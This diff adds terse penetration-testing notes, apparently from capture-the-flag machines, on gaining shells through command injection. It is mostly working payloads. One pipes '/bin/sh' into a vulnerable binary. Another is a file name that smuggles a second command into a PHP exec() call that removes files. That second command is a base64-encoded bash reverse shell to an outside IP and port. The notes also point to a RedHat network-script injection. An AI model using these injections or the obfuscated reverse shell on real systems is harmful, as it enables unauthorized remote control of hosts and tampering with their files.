@@ -1,0 +1,14 @@
+1-check for any file or directory or input where user can write 
+
+#for c binary code taking in account our input and running a system command
+/bin/c_binary code "$(printf 'aaa\n/bin/sh\nls')" #Example Node machine
+
+#for bash code with directory 
+#example of code vul; value is a file  that can be created by user
+exec("nohup /bin/rm -f /var/www/uploads/$value > /dev/null 2>&1 &");
+touch ";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMTIvMjIyMiAwPiYxCg==|base64 -d|bash"
+
+#space after command can lead to code execution Ex of /sbin/ifup running 
+#/etc/sysconfig/network-scripts/ifcfg-guly in redhat (Networked machine)
+
+
